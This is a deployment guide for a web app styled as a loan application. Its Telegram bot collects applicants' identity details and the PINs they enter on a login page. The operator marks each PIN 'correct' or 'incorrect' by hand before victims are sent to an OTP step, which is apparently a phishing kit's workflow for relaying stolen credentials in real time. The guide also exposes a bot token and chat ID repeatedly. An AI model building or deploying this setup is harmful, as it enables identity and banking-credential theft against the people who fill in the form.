# Telegram Integration Setup Guide

This application now includes Telegram bot integration for form submission notifications, PIN verification, and approval workflow.

## Features

- **Form Submission Notifications**: When a user submits a loan application, you'll receive a detailed notification in Telegram
- **Inline Buttons**: Each notification includes "Approve" and "Decline" buttons for quick action
- **PIN Verification**: When a user enters their PIN, you'll receive a notification with "PIN Correct" and "PIN Incorrect" buttons
- **Status Tracking**: Form submissions are tracked with unique IDs and status updates
- **Real-time Updates**: Status changes are immediately reflected in Telegram

## Environment Variables

The following environment variables are required:

```env
TELEGRAM_BOT_TOKEN=8654414314:AAGViPVbCKNfohLBw73x-wM11wuI6h_Rpsw
TELEGRAM_CHAT_ID=8045300220
PORT=3000
APP_URL=https://your-app-url.onrender.com
```

## Setup Instructions

### 1. Create a Telegram Bot (if not already done)

1. Open Telegram and search for @BotFather
2. Send `/newbot` and follow the instructions
3. Copy the bot token (you already have this: `8654414314:AAGViPVbCKNfohLBw73x-wM11wuI6h_Rpsw`)

### 2. Get Your Chat ID

1. Start a conversation with your bot
2. Send a message to the bot
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Look for `"chat":{"id":8045300220` in the response
5. Your chat ID is `8045300220` (already configured)

### 3. Local Development

```bash
# Install dependencies
npm install

# Start the server
npm run server

# In another terminal, start the frontend (for development)
npm run dev
```

### 4. Production Deployment on Render

#### Step 1: Build the Application

```bash
npm run build
```

#### Step 2: Deploy to Render

1. Create a new Web Service on Render
2. Connect your GitHub repository
3. Configure the following:
   - **Build Command**: `npm install && npm run build`
   - **Start Command**: `npm start`
   - **Environment Variables**:
     - `TELEGRAM_BOT_TOKEN`: `8654414314:AAGViPVbCKNfohLBw73x-wM11wuI6h_Rpsw`
     - `TELEGRAM_CHAT_ID`: `8045300220`
     - `PORT`: `3000`
     - `APP_URL`: Your Render service URL (e.g., `https://your-app.onrender.com`)

#### Step 3: Set the Webhook

After deployment, the server will automatically set the Telegram webhook. You can verify it by:

```bash
curl https://api.telegram.org/bot8654414314:AAGViPVbCKNfohLBw73x-wM11wuI6h_Rpsw/getWebhookInfo
```

## API Endpoints

### POST /api/submit-form
Submits a loan application form and sends a Telegram notification.

**Request Body:**
```json
{
  "fullName": "John Doe",
  "phone": "+263772123456",
  "email": "john@example.com",
  "idNumber": "12345678",
  "dobYear": "1990",
  "dobMonth": "5",
  "dobDay": "15",
  "employment": "Employed",
  "income": "5000",
  "loanType": "Personal Loan",
  "loanAmount": "10000",
  "repayment": "12 Months",
  "terms": true
}
```

**Response:**
```json
{
  "success": true,
  "submissionId": "1729500000000"
}
```

### GET /api/submission/:id
Retrieves the status of a form submission.

**Response:**
```json
{
  "id": "1729500000000",
  "fullName": "John Doe",
  "status": "approved",
  "timestamp": "2024-10-21T12:00:00.000Z"
}
```

### POST /api/verify-pin
Sends a PIN verification request to Telegram.

**Request Body:**
```json
{
  "submissionId": "1729500000000",
  "pin": "1234",
  "formData": {
    "fullName": "John Doe",
    "phone": "+263772123456",
    "loanAmount": "10000"
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "PIN verification request sent"
}
```

### GET /api/pin-status/:id
Retrieves the PIN verification status for a submission.

**Response:**
```json
{
  "pinVerified": true,
  "pinStatus": "correct"
}
```

### POST /webhook/telegram
Webhook endpoint for Telegram bot callbacks (handled automatically).

## How It Works

### Form Submission Flow
1. **Form Submission**: When a user submits the loan form, the data is sent to `/api/submit-form`
2. **Telegram Notification**: The server sends a formatted message to your Telegram chat with "Approve" and "Decline" buttons
3. **Approval/Decline**: Clicking the buttons sends a callback to the webhook
4. **Status Update**: The server updates the submission status and sends a confirmation message

### PIN Verification Flow
1. **PIN Entry**: When a user enters their PIN on the login page, the PIN is sent to `/api/verify-pin`
2. **Telegram Notification**: The server sends a PIN verification request to your Telegram with "PIN Correct" and "PIN Incorrect" buttons
3. **Verification Decision**: Clicking either button updates the PIN verification status
4. **Status Polling**: The frontend polls `/api/pin-status/:id` every second to check the verification result
5. **User Feedback**: If verified, the user proceeds to OTP. If declined, they see an error message.

## Testing

### Form Submission Testing
1. Start the server: `npm run server`
2. Open the application in your browser
3. Fill out and submit the loan form
4. Check your Telegram for the notification
5. Click "Approve" or "Decline" to test the workflow

### PIN Verification Testing
1. Complete the form submission and proceed to the dashboard
2. Click "Proceed to Confirm" to go to the login page
3. Enter a 4-digit PIN (not 0000)
4. Check your Telegram for the PIN verification notification
5. Click "PIN Correct" to approve - the user will proceed to OTP
6. Click "PIN Incorrect" to decline - the user will see an error message

## Troubleshooting

### Webhook Not Setting
- Ensure `APP_URL` is set correctly in environment variables
- The URL must be publicly accessible (not localhost)
- Check server logs for errors

### No Telegram Messages
- Verify `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are correct
- Ensure you've started a conversation with your bot
- Check that the webhook is set correctly

### Buttons Not Working
- Verify the webhook endpoint is receiving callbacks
- Check server logs for callback processing errors
- Ensure the submission ID exists in memory

## Security Notes

- **Never commit your `.env` file** to version control
- The bot token should be kept secret
- In production, consider using a database instead of in-memory storage
- Add rate limiting to prevent abuse
- Implement authentication for API endpoints if needed
